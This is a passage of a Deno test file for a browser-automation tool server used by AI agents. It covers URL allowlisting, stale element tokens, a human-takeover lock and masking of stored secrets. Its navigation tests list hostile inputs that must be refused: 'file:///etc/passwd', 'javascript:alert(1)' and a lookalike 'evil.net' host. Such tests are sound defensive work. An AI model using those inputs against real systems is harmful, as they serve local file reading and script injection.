/** Tool-handler tests against a fake browser session. */
import { assert, assertEquals, assertRejects, assertStringIncludes } from '@std/assert';
import {
	type BrowserSession,
	type EnhancedDomTreeNode,
	isPasswordField,
	isSecretFilled,
	markSecretFilled,
} from '@tykotech/browser';
import { EventBus } from '@tykotech/bus';
import { CATALOG } from './catalog.ts';
import { inputStateOf, MASKED_INPUT_VALUE, resolveFields, textOf as recordTextOf } from './element_record.ts';
import { ToolError } from './errors.ts';
import { observe } from './observe.ts';
import { SessionRegistry } from './registry.ts';
import { OUTPUT } from './schemas.ts';
import { SecretStore } from './secrets.ts';
import { HTML_LIMIT } from './tools/perception.ts';
import type { ToolContext, ToolResult } from './types.ts';
import * as tools from './tools.ts';
import { fromFileUrl } from '@std/path';
import {
	captureHarness,
	CHILD_DOCUMENT,
	type FrameCdpHarness,
	frameCdpHarness,
	PAGE_SESSION,
	type PageOuterHtml,
	TOP_DOC_SENTINEL,
	TOP_DOCUMENT,
} from '../fixtures/capture_session.ts';

interface FakeOptions {
	/** Tabs as `TabInfo` really shapes them: a full `targetId` plus the four-character `tabId` a model is shown. */
	tabs?: Array<{ targetId: string; tabId: string; url: string; title: string }>;
	selectorMap?: Map<number, unknown>;
	dispatchError?: Error;
	/** The identity of the table in `selectorMap`. `null` models a build that minted none. */
	stateToken?: string | null;
	/** Models a session that holds no state at all, which is not the same as an empty table. */
	noCachedState?: boolean;
}

/** A DOM node with the fields the element-event sanitizer walks. */
function fakeNode(nodeName = 'BUTTON'): Record<string, unknown> {
	return {
		nodeName,
		nodeId: 1,
		backendNodeId: 1,
		nodeType: 1,
		nodeValue: '',
		attributes: {},
		isScrollable: false,
		isVisible: true,
		absolutePosition: null,
		targetId: 'T1',
		frameId: null,
		sessionId: null,
		parentNode: null,
		childrenNodes: [],
		contentDocument: null,
		axNode: null,
		snapshotNode: null,
		shadowRootType: null,
		shadowRoots: null,
		compoundChildren: [],
		hasJsClickListener: false,
		hiddenElementsInfo: [],
		hasHiddenContent: false,
		uuid: 'node-uuid',
	};
}

/** Records what the handlers dispatch, so assertions can inspect intent. */
interface Fake {
	session: BrowserSession;
	dispatched: Array<{ name: string; event: Record<string, unknown> }>;
}

function fakeSession(options: FakeOptions = {}): Fake {
	const dispatched: Array<{ name: string; event: Record<string, unknown> }> = [];
	const session = {
		tabs: options.tabs ?? [],
		agentFocusTargetId: options.tabs?.[0]?.targetId ?? null,
		cdpClient: null,
		sessionManager: null,
		cachedBrowserState: options.noCachedState === true ? null : {
			url: 'https://example.com/',
			stateToken: options.stateToken === undefined ? 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' : options.stateToken,
			title: 'Example',
			domState: { selectorMap: options.selectorMap ?? new Map(), root: null },
			pageInfo: { viewportWidth: 1280, viewportHeight: 720, pixelsAbove: 0, pixelsBelow: 0, scrollX: 0, scrollY: 0 },
		},
		eventBus: Object.assign(new EventBus({ name: 'fake-tools-session' }), {
			dispatch(event: Record<string, unknown>) {
				dispatched.push({ name: event.constructor.name, event });
				return {
					eventResult: () => {
						if (options.dispatchError !== undefined) return Promise.reject(options.dispatchError);
						return Promise.resolve('ok');
					},
				};
			},
		}),
		stop: () => Promise.resolve(),
		kill: () => Promise.resolve(),
	};
	return { session: session as unknown as BrowserSession, dispatched };
}

async function harness(options: FakeOptions & { allowedDomains?: string[]; dataDir?: string } = {}) {
	const fake = fakeSession(options);
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		launch: () => Promise.resolve(fake.session),
		...(options.dataDir === undefined ? {} : { dataDir: options.dataDir }),
	});
	const record = await registry.resolve(undefined);
	const ctx: ToolContext = {
		registry,
		allowedDomains: options.allowedDomains ?? [],
		principal: 'test',
	};
	return { registry, ctx, record, fake };
}

function textOf(result: ToolResult): string {
	return (result.content as Array<{ type: string; text?: string }>)
		.filter((block) => block.type === 'text')
		.map((block) => block.text ?? '')
		.join('\n');
}

// --- navigation policy --------------------------------------------------------

Deno.test('tools: navigate refuses non-http schemes and malformed URLs; an empty allowlist admits any host', async () => {
	const { ctx, registry } = await harness();
	for (const url of ['data:text/html,<h1>x', 'file:///etc/passwd', 'javascript:alert(1)']) {
		const error = await assertRejects(() => tools.browserNavigate({ url }, ctx), ToolError);
		assert(error.code === 'navigation-blocked' || error.code === 'invalid-arguments', `${url} produced ${error.code}`);
	}
	const malformed = await assertRejects(() => tools.browserNavigate({ url: 'not a url' }, ctx), ToolError);
	assertEquals(malformed.code, 'invalid-arguments', 'an argument error, not a policy refusal');
	assertStringIncludes(
		textOf(await tools.browserNavigate({ url: 'https://anywhere.example.org/' }, ctx)),
		'session_id',
	);
	await registry.shutdown();
});

Deno.test('tools: navigate enforces the domain allowlist by suffix', async () => {
	const { ctx, registry } = await harness({ allowedDomains: ['example.com'] });
	for (const url of ['https://example.com/a', 'https://docs.example.com/b']) {
		assertStringIncludes(textOf(await tools.browserNavigate({ url }, ctx)), 'session_id');
	}
	for (const url of ['https://notexample.com/', 'https://example.com.evil.net/']) {
		const error = await assertRejects(() => tools.browserNavigate({ url }, ctx), ToolError);
		assertEquals(error.code, 'navigation-blocked', url);
	}
	await registry.shutdown();
});

// --- element and tab resolution ------------------------------------------------

Deno.test('tools: clicking an unknown index names the recovery', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[1, fakeNode()]]) });
	const error = await assertRejects(() => tools.browserClick({ index: 99 }, ctx), ToolError);
	assertEquals(error.code, 'unknown-index');
	assertStringIncludes(error.message, 'browser_get_state');
	await registry.shutdown();
});

Deno.test('tools: an index sent with a stale state_token is refused, not resolved', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[1, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	const error = await assertRejects(
		() => tools.browserClick({ index: 1, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'element-not-found');
	assertEquals(error.extras.reason, 'stale-token');
	assertEquals(error.extras.state_token, 'cccccccccccccccc.dddddddddddddddd');
	assertEquals(error.extras.index, 1);
	await registry.shutdown();
});

Deno.test('tools: an index sent with no table held reports no-state, not unknown-index', async () => {
	const { ctx, registry } = await harness({ noCachedState: true });
	const error = await assertRejects(() => tools.browserClick({ index: 1 }, ctx), ToolError);
	assertEquals(error.code, 'element-not-found');
	assertEquals(error.extras.reason, 'no-state');
	assertEquals(error.extras.state_token, null);
	assertStringIncludes(error.message, 'browser_get_state');
	await registry.shutdown();
});

Deno.test('tools: omitting state_token clicks against the held table, and the result carries its token', async () => {
	const { ctx, registry, fake } = await harness({
		selectorMap: new Map([[3, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	const result = await tools.browserClick({ index: 3 }, ctx);
	assertEquals(fake.dispatched.at(-1)?.name, 'ClickElementEvent');
	assertEquals(
		(result.structuredContent as { state_token?: unknown }).state_token,
		'cccccccccccccccc.dddddddddddddddd',
	);
	await tools.browserClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	const last = fake.dispatched.at(-1);
	assertEquals(last?.name, 'ClickCoordinateEvent');
	assertEquals((last?.event as { coordinateX: number }).coordinateX, 12);
	await registry.shutdown();
});

// --- the pointer and keyboard tools -------------------------------------------------

Deno.test('pointer and keys: double click and right click reach the SAME event with one field changed', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });

	await tools.browserDoubleClick({ index: 3 }, ctx);
	const dbl = fake.dispatched.at(-1);
	assertEquals(dbl?.name, 'ClickElementEvent');
	assertEquals((dbl?.event as { clickCount: number }).clickCount, 2);
	assertEquals((dbl?.event as { button: string }).button, 'left');

	await tools.browserRightClick({ index: 3 }, ctx);
	const right = fake.dispatched.at(-1);
	assertEquals(right?.name, 'ClickElementEvent');
	assertEquals((right?.event as { button: string }).button, 'right');
	assertEquals((right?.event as { clickCount: number }).clickCount, 1);

	await tools.browserClick({ index: 3 }, ctx);
	const single = fake.dispatched.at(-1);
	assertEquals((single?.event as { clickCount: number }).clickCount, 1);
	assertEquals((single?.event as { button: string }).button, 'left');
	await registry.shutdown();
});

Deno.test('pointer and keys: the coordinate arm of each pointer tool carries the same two fields', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserDoubleClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	const dbl = fake.dispatched.at(-1);
	assertEquals(dbl?.name, 'ClickCoordinateEvent');
	assertEquals((dbl?.event as { clickCount: number }).clickCount, 2);
	await tools.browserRightClick({ coordinate_x: 12, coordinate_y: 34 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { button: string }).button, 'right');
	await registry.shutdown();
});

Deno.test('pointer and keys: hover dispatches a HoverEvent and never a click', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode()]]) });
	await tools.browserHover({ index: 3 }, ctx);
	assertEquals(fake.dispatched.at(-1)?.name, 'HoverEvent');
	await tools.browserHover({ coordinate_x: 7, coordinate_y: 8 }, ctx);
	const point = fake.dispatched.at(-1);
	assertEquals(point?.name, 'HoverEvent');
	assertEquals((point?.event as { node: unknown }).node, null, 'a point hover targets no node');
	assertEquals((point?.event as { coordinateX: number }).coordinateX, 7);
	assert(
		fake.dispatched.every((entry) => !entry.name.startsWith('Click')),
		'no hover may dispatch a click',
	);
	await registry.shutdown();
});

Deno.test('pointer and keys: a pointer tool resolves its index through the ONE resolver (state_token honoured)', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[3, fakeNode()]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	for (
		const call of [
			() => tools.browserDoubleClick({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserRightClick({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserHover({ index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
			() => tools.browserPressKey({ key: 'a', index: 3, state_token: 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb' }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'element-not-found');
		assertEquals(error.extras.reason, 'stale-token');
	}
	await registry.shutdown();
});

Deno.test('pointer and keys: press_key folds, aliases and de-duplicates modifiers, and refuses an unknown one', async () => {
	const { ctx, registry, fake } = await harness();
	const error = await assertRejects(() => tools.browserPressKey({ key: 'a', modifiers: ['controll'] }, ctx), ToolError);
	assertEquals(error.code, 'invalid-arguments');
	assertStringIncludes(error.message, 'controll');
	assertEquals(fake.dispatched.length, 0, 'nothing may reach the browser after a refusal');
	const result = await tools.browserPressKey({ key: 'a', modifiers: ['Control', 'SHIFT'] }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { keys: string }).keys, 'ctrl+shift+a');
	assertEquals(result.structuredContent as { key: string; modifiers: number }, {
		...(result.structuredContent as object),
		key: 'ctrl+shift+a',
		modifiers: 10,
	});
	await tools.browserPressKey({ key: 'k', modifiers: ['cmd', 'command', 'meta'] }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { keys: string }).keys, 'meta+k');
	await registry.shutdown();
});

Deno.test('pointer and keys: press_key with an index carries the node so the element is focused first', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const result = await tools.browserPressKey({ key: 'Enter', index: 3 }, ctx);
	const event = fake.dispatched.at(-1);
	assertEquals(event?.name, 'SendKeysEvent');
	assert((event?.event as { node: unknown }).node !== null, 'the node travels with the event');
	assertEquals((result.structuredContent as { index?: number }).index, 3);
	await tools.browserPressKey({ key: 'Enter' }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { node: unknown }).node, null);
	await registry.shutdown();
});

/**
 * The takeover lock, over the whole catalog: `mutates` only drives annotations, and each handler checks the lock itself,
 * so a mutating tool that skipped the check would act under a person's hands. Every one answers `human-has-control`,
 * which tells the agent to wait; the exemptions are the ones the docs name. A new mutating tool fails here until it is
 * given arguments below (and refuses) or is exempted with its reason.
 */
const LOCKED_ARGS: Record<string, Record<string, unknown>> = {
	browser_navigate: { url: 'https://example.com/' },
	browser_go_back: {},
	browser_click: { index: 3 },
	browser_double_click: { index: 3 },
	browser_right_click: { index: 3 },
	browser_hover: { index: 3 },
	browser_type: { index: 3, text: 'a' },
	browser_press_key: { key: 'a', modifiers: ['ctrl'] },
	browser_fill: { index: 3, value: 'a' },
	browser_scroll_to: { text: 'a' },
	browser_scroll_into_view: { index: 3 },
	browser_select_option: { index: 3, option: 'a' },
	browser_upload_file: { index: 3, files: ['a.txt'] },
	browser_handle_dialog: { accept: true },
	browser_drag: { from_index: 3, to_index: 3 },
	browser_scroll: { direction: 'down' },
	browser_fill_secret: { index: 3, name: 'a' },
	browser_evaluate: { expression: '1' },
	browser_run_task: { task: 'a' },
	browser_set_viewport: { width: 800, height: 600 },
	browser_set_session_options: { block_images: true },
	browser_switch_tab: { tab_id: 'T1' },
	browser_close_tab: { tab_id: 'T1' },
	browser_storage_state: { action: 'load', name: 'a' },
	browser_download: { url: 'https://example.com/a.txt' },
};
const LOCK_EXEMPT: Record<string, string> = {
	browser_close_session: 'closing is administrative: it ends the session for its viewers too',
	browser_close_all: 'closing is administrative',
};

Deno.test('takeover: every mutating tool is refused with human-has-control while a person holds the session', async () => {
	await Deno.mkdir('tests/.scratch', { recursive: true });
	const dataDir = await Deno.makeTempDir({ dir: 'tests/.scratch', prefix: 'takeover-' });
	const { ctx, registry, record } = await harness({ selectorMap: new Map([[3, fakeNode()]]), dataDir });
	const viewer = { id: 'v1', principal: 'p', mode: 'control' as const, send: () => {}, close: () => {} };
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);
	try {
		const mutating = CATALOG.filter((tool) => tool.mutates && !(tool.name in LOCK_EXEMPT));
		assertEquals(mutating.map((tool) => tool.name).sort(), Object.keys(LOCKED_ARGS).sort());
		for (const tool of mutating) {
			const error = await assertRejects(() => tool.handler(LOCKED_ARGS[tool.name] as never, ctx), ToolError);
			assertEquals(error.code, 'human-has-control', `${tool.name} answered ${error.code}: ${error.message}`);
		}
		// A save only reads the browser, so the lock does not refuse it (whatever the fake session then answers).
		const save = await tools.browserStorageState({ action: 'save', name: 'a' }, ctx).catch((error) => error);
		assert(!(save instanceof ToolError && save.code === 'human-has-control'), 'a storage-state save is not refused');
	} finally {
		await registry.shutdown();
		await Deno.remove(dataDir, { recursive: true });
	}
});

// --- fill, scrolling, selects, upload, drag ----------------------------------------

Deno.test('actions: browser_fill clears by DEFAULT where browser_type appends by default', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });

	await tools.browserType({ text: 'hello', index: 3 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, false, 'type appends');

	const filled = await tools.browserFill({ index: 3, text: 'hello' }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, true, 'fill replaces');
	assertEquals((filled.structuredContent as { cleared: boolean }).cleared, true);

	const appended = await tools.browserFill({ index: 3, text: 'hello', clear: false }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { clear: boolean }).clear, false);
	assertEquals((appended.structuredContent as { cleared: boolean }).cleared, false);
	await registry.shutdown();
});

Deno.test('actions: browser_fill inherits browser_type’s disclosure rules rather than restating them', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const result = await tools.browserFill({ index: 3, text: 'plain text' }, ctx);
	const payload = result.structuredContent as { sensitive: boolean; typed_length?: number; index: number };
	assertEquals(payload.sensitive, false);
	assertEquals(payload.typed_length, 'plain text'.length);
	assertEquals(payload.index, 3);
	await registry.shutdown();
});

Deno.test('actions: upload refuses a file id this session never tracked', async () => {
	const { ctx, registry, fake } = await harness({ selectorMap: new Map([[3, fakeNode('INPUT')]]) });
	const error = await assertRejects(
		() => tools.browserUploadFile({ index: 3, file_id: 'not-a-file' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'unknown-file');
	assertEquals(
		fake.dispatched.filter((entry) => entry.name === 'UploadFileEvent').length,
		0,
		'nothing may reach the browser before the file resolves',
	);
	await registry.shutdown();
});

Deno.test('actions: the CDP-backed actions refuse cleanly on a session with no connection', async () => {
	const { ctx, registry } = await harness({ selectorMap: new Map([[3, fakeNode('SELECT')]]) });
	for (
		const call of [
			() => tools.browserScrollTo({ x: 0, y: 400 }, ctx),
			() => tools.browserScrollIntoView({ index: 3 }, ctx),
			() => tools.browserSelectOption({ index: 3, value: 'b' }, ctx),
			() => tools.browserDrag({ from: { x: 1, y: 2 }, to: { x: 3, y: 4 } }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'browser-unavailable');
	}
	await registry.shutdown();
});

Deno.test('actions: an index-addressed action tool honours state_token through the ONE resolver', async () => {
	const { ctx, registry } = await harness({
		selectorMap: new Map([[3, fakeNode('SELECT')]]),
		stateToken: 'cccccccccccccccc.dddddddddddddddd',
	});
	const stale = 'aaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbb';
	for (
		const call of [
			() => tools.browserFill({ index: 3, text: 'x', state_token: stale }, ctx),
			() => tools.browserScrollIntoView({ index: 3, state_token: stale }, ctx),
			() => tools.browserSelectOption({ index: 3, value: 'b', state_token: stale }, ctx),
			() => tools.browserUploadFile({ index: 3, file_id: 'f', state_token: stale }, ctx),
			() => tools.browserDrag({ from: { index: 3 }, to: { x: 1, y: 2 }, state_token: stale }, ctx),
		]
	) {
		const error = await assertRejects(call, ToolError);
		assertEquals(error.code, 'element-not-found');
		assertEquals(error.extras.reason, 'stale-token');
	}
	await registry.shutdown();
});

Deno.test('actions: handle_dialog says WHY nothing was answered, and never echoes prompt_text', async () => {
	const { ctx, registry, record } = await harness();
	assertEquals(record.popups, null);
	const missing = await assertRejects(
		() => tools.browserHandleDialog({ dialog_id: 'd1', accept: true, prompt_text: 'Ada' }, ctx),
		ToolError,
	);
	assertEquals(missing.code, 'feature-unavailable');
	assert(!JSON.stringify(missing.structuredPayload).includes('Ada'), missing.message);
	await registry.shutdown();
});

// --- session introspection and options ----------------------------------------------

Deno.test('sessions: get_session and list_sessions carry EXACTLY the same fields', async () => {
	const { ctx, registry } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
		allowedDomains: ['a.test'],
	});
	const one = (await tools.browserGetSession({}, ctx)).structuredContent as Record<string, unknown>;
	const listed = (await tools.browserListSessions({}, ctx)).structuredContent as {
		details: Array<Record<string, unknown>>;
	};
	assertEquals(listed.details.length, 1);
	assertEquals(Object.keys(one).sort(), Object.keys(listed.details[0]!).sort());
	assertEquals(one.session_id, 'default');
	assertEquals(one.origin_allowlist, ['a.test'], 'the list effective for THIS principal');
	assertEquals(one.human_has_control, false);
	assertEquals(one.holder, null);
	assertEquals(one.last_input_at, null, 'a session that has been read but never driven');
	await registry.shutdown();
});

Deno.test('sessions: list_sessions keeps its frozen text payload and grows only the structured half', async () => {
	const { ctx, registry } = await harness();
	const result = await tools.browserListSessions({}, ctx);
	const text = JSON.parse(textOf(result)) as Record<string, unknown>;
	assertEquals(Object.keys(text), ['sessions']);
	assert(!('details' in text), 'the fuller records are structured-only');
	assert('details' in (result.structuredContent as Record<string, unknown>));
	await registry.shutdown();
});

Deno.test('sessions: get_session reports the holder, and stays available while a human holds it', async () => {
	const { ctx, registry, record } = await harness();
	const viewer = {
		id: 'v1',
		principal: 'operator',
		mode: 'control' as const,
		holderName: 'Ada',
		send: () => {},
		close: () => {},
	};
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);
	const payload = (await tools.browserGetSession({}, ctx)).structuredContent as {
		human_has_control: boolean;
		holder: { principal: string; holder_name: string | null } | null;
		viewers: number;
	};
	assertEquals(payload.human_has_control, true);
	assertEquals(payload.holder?.principal, 'operator');
	assertEquals(payload.holder?.holder_name, 'Ada');
	assertEquals(payload.viewers, 1);
	await registry.shutdown();
});

Deno.test('sessions: set_session_options reports what took and NAMES what did not', async () => {
	const { ctx, registry, record } = await harness();
	const payload = (await tools.browserSetSessionOptions({
		locale: 'fr-FR',
		timezone: 'Europe/Amsterdam',
		accept_downloads: true,
		idle_timeout_s: 600,
	}, ctx)).structuredContent as {
		applied: Record<string, unknown>;
		unsupported: string[];
		state_token: null;
	};

	assertEquals(payload.applied.idle_timeout_s, 600);
	assertEquals(record.idleTimeoutMs, 600_000);
	assert(payload.unsupported.includes('accept_downloads'));
	assertEquals(payload.state_token, null);
	await registry.shutdown();
});

Deno.test('sessions: a per-session idle timeout is what the reaper actually uses', async () => {
	let clock = 1_000_000;
	const fake = fakeSession();
	const registry = new SessionRegistry({
		reapIntervalMs: 0,
		sessionTtlMs: 1_000,
		now: () => clock,
		launch: () => Promise.resolve(fake.session),
	});
	const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
	const record = await registry.resolve(undefined);
	await tools.browserSetSessionOptions({ idle_timeout_s: 3_600 }, ctx);

	clock += 60_000;
	assertEquals(await registry.reap(), 0, 'the per-session override is what decides');
	record.idleTimeoutMs = undefined;
	assertEquals(await registry.reap(), 1);
	await registry.shutdown();
});

Deno.test('sessions: a storage-state load names the origins it restored, and nothing else', async () => {
	const scratch = fromFileUrl(new URL('../../../tests/.scratch', import.meta.url));
	await Deno.mkdir(scratch, { recursive: true });
	const dir = await Deno.makeTempDir({ dir: scratch, prefix: 'ttk-storage-origins-' });
	try {
		const seeded = {
			cookies: [{ name: 'session', value: 'SENTINEL-COOKIE-VALUE', domain: 'a.test', path: '/' }],
			origins: [
				{ origin: 'https://a.test', localStorage: [{ name: 'token', value: 'SENTINEL-STORAGE-VALUE' }] },
				{ origin: 'https://b.test', localStorage: [] },
			],
		};
		await Deno.mkdir(`${dir}/storage`, { recursive: true });
		await Deno.writeTextFile(`${dir}/storage/login.json`, JSON.stringify(seeded));

		const fake = fakeSession();
		const registry = new SessionRegistry({
			reapIntervalMs: 0,
			dataDir: dir,
			launch: () => Promise.resolve(fake.session),
		});
		const ctx: ToolContext = { registry, allowedDomains: [], principal: 'test' };
		const result = await tools.browserStorageState({ action: 'load', name: 'login' }, ctx);
		const payload = result.structuredContent as { restored_origins: string[]; origins: number; cookies: number };

		assertEquals(payload.restored_origins, ['https://a.test', 'https://b.test']);
		assertEquals(payload.origins, 2);
		assertEquals(payload.cookies, 1);
		const whole = JSON.stringify(result);
		assert(!whole.includes('SENTINEL-COOKIE-VALUE'), whole);
		assert(!whole.includes('SENTINEL-STORAGE-VALUE'), whole);
		assert(!whole.includes('"token"'), whole);

		const saved = await tools.browserStorageState({ action: 'save', name: 'login' }, ctx);
		assert(!('restored_origins' in (saved.structuredContent as Record<string, unknown>)));
		await registry.shutdown();
	} finally {
		await Deno.remove(dir, { recursive: true }).catch(() => {});
	}
});

Deno.test("storage state: in owner mode a storage-state name is the caller's own; shared mode keeps the flat layout", async () => {
	const scratch = fromFileUrl(new URL('../../../tests/.scratch', import.meta.url));
	await Deno.mkdir(scratch, { recursive: true });
	const dir = await Deno.makeTempDir({ dir: scratch, prefix: 'ttk-storage-owner-' });
	try {
		const seeded = JSON.stringify({ cookies: [{ name: 'sid', value: 'A-SECRET', domain: 'gh.test', path: '/' }] });
		const fakes: Fake[] = [];
		const owned = new SessionRegistry({
			reapIntervalMs: 0,
			dataDir: dir,
			ownership: 'owner',
			launch: () => {
				const fake = fakeSession();
				fakes.push(fake);
				return Promise.resolve(fake.session);
			},
		});
		const alice = { owner: 'apikey:alice', admin: false };
		const bob = { owner: 'apikey:bob', admin: false };
		const aliceDir = (await owned.storageDirFor(alice))!;
		const bobDir = (await owned.storageDirFor(bob))!;
		assert(aliceDir !== bobDir, 'each owner has its own directory');
		assert(aliceDir.startsWith(`${dir}/storage/owners/`), aliceDir);
		assert(!aliceDir.includes('alice'), 'the owner is digested, never written as a path segment');
		await Deno.mkdir(aliceDir, { recursive: true });
		await Deno.writeTextFile(`${aliceDir}/github.json`, seeded);

		const aliceCtx: ToolContext = { registry: owned, allowedDomains: [], principal: 'alice', access: alice };
		const bobCtx: ToolContext = { registry: owned, allowedDomains: [], principal: 'bob', access: bob };
		const loaded = await tools.browserStorageState({ action: 'load', name: 'github' }, aliceCtx);
		assertEquals((loaded.structuredContent as { cookies: number }).cookies, 1);
		const refused = await assertRejects(
			() => tools.browserStorageState({ action: 'load', name: 'github' }, bobCtx),
			ToolError,
			'no saved storage state named github',
		);
		assertEquals(refused.code, 'invalid-arguments');
		await tools.browserStorageState({ action: 'save', name: 'github' }, bobCtx);
		const bobSave = fakes.flatMap((fake) => fake.dispatched).filter((entry) => entry.name === 'SaveStorageStateEvent')
			.at(-1);
		assertEquals((bobSave?.event as { path: string }).path, `${bobDir}/github.json`);
		assertEquals(await Deno.readTextFile(`${aliceDir}/github.json`), seeded);
		await Deno.writeTextFile(`${dir}/storage/flat.json`, seeded);
		await assertRejects(
			() => tools.browserStorageState({ action: 'load', name: 'flat' }, aliceCtx),
			ToolError,
			'no saved storage state named flat',
		);
		await assertRejects(() => owned.storageDirFor(undefined), ToolError);
		await owned.shutdown();

		const fake = fakeSession();
		const shared = new SessionRegistry({
			reapIntervalMs: 0,
			dataDir: dir,
			launch: () => Promise.resolve(fake.session),
		});
		assertEquals(await shared.storageDirFor(alice), `${dir}/storage`);
		assertEquals(await shared.storageDirFor(undefined), `${dir}/storage`);
		const flat = await tools.browserStorageState(
			{ action: 'load', name: 'flat' },
			{ registry: shared, allowedDomains: [], principal: 'bob', access: bob },
		);
		assertEquals((flat.structuredContent as { cookies: number }).cookies, 1);
		await shared.shutdown();
	} finally {
		await Deno.remove(dir, { recursive: true }).catch(() => {});
	}
});

Deno.test('tools: switching to an unknown tab is refused', async () => {
	const { ctx, registry } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
	});
	const error = await assertRejects(() => tools.browserSwitchTab({ tab_id: 'T9' }, ctx), ToolError);
	assertEquals(error.code, 'unknown-tab');
	await registry.shutdown();
});

Deno.test('tools: list_tabs reports focus', async () => {
	const { ctx, registry } = await harness({
		tabs: [
			{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' },
			{ targetId: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBT2', tabId: 'T2', url: 'https://b.test/', title: 'B' },
		],
	});
	const parsed = JSON.parse(textOf(await tools.browserListTabs({}, ctx))) as {
		tabs: Array<{ tab_id: string; focused: boolean }>;
	};
	assertEquals(parsed.tabs.length, 2);
	assertEquals(parsed.tabs[0]?.focused, true);
	assertEquals(parsed.tabs[1]?.focused, false);
	await registry.shutdown();
});

// --- scrolling -------------------------------------------------------------------

Deno.test('tools: scroll converts pages into viewport-relative pixels', async () => {
	const { ctx, registry, fake } = await harness();
	await tools.browserScroll({ direction: 'down' }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { amount: number }).amount, 540);

	await tools.browserScroll({ direction: 'up', pages: 2 }, ctx);
	assertEquals((fake.dispatched.at(-1)?.event as { amount: number }).amount, 1440);
	await registry.shutdown();
});

// --- lock enforcement --------------------------------------------------------------

// Every mutating tool's refusal is the `takeover:` test's; this one covers observation under the lock and release.
Deno.test('tools: a held lock refuses mutation but permits observation', async () => {
	const { ctx, registry, record } = await harness({
		tabs: [{ targetId: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT1', tabId: 'T1', url: 'https://a.test/', title: 'A' }],
	});
	const viewer = {
		id: 'v1',
		mode: 'control' as const,
		principal: 'human',
		send: () => {},
		close: () => {},
	};
	registry.addViewer(record, viewer);
	registry.takeControl(record, viewer);

	const refused = await assertRejects(() => tools.browserPressKey({ key: 'Enter' }, ctx), ToolError);
	assertEquals(refused.code, 'human-has-control');

	const tabs = await tools.browserListTabs({}, ctx);
	assertStringIncludes(textOf(tabs), 'T1');
	assertStringIncludes(textOf(await tools.browserListSessions({}, ctx)), 'human_has_control');

	registry.releaseControl(record, 'v1');
	await tools.browserPressKey({ key: 'Enter' }, ctx);
	await registry.shutdown();
});

// --- error mapping -------------------------------------------------------------------

Deno.test('tools: a dispatch timeout maps to the timeout code', async () => {
	const { ctx, registry } = await harness({ dispatchError: new Error('operation timed out after 20s') });
	const error = await assertRejects(() => tools.browserPressKey({ key: 'a' }, ctx), ToolError);
	assertEquals(error.code, 'timeout');
	await registry.shutdown();
});

Deno.test('tools: a crash maps to the crash code', async () => {
	const { ctx, registry } = await harness({ dispatchError: new Error('target crashed unexpectedly') });
	const error = await assertRejects(() => tools.browserGoBack({}, ctx), ToolError);
	assertEquals(error.code, 'browser-crashed');
	await registry.shutdown();
});

// --- sessions ---------------------------------------------------------------------------

Deno.test('tools: closing an unknown session is an error, closing a known one is not', async () => {
	const { ctx, registry, record } = await harness();
	const error = await assertRejects(
		() => tools.browserCloseSession({ session_id: '01JNOPE' }, ctx),
		ToolError,
	);
	assertEquals(error.code, 'unknown-session');

	const ok = await tools.browserCloseSession({ session_id: record.id }, ctx);
	assertStringIncludes(textOf(ok), record.id);
	await registry.shutdown();
});

Deno.test('tools: close_all reports how many it closed', async () => {
	const { ctx, registry } = await harness();
	await registry.createNew();
	const result = await tools.browserCloseAll({}, ctx);
	assertStringIncludes(textOf(result), 'Closed 2 sessions');
	await registry.shutdown();
});

Deno.test('tools: navigate with new_session returns a distinct session id', async () => {
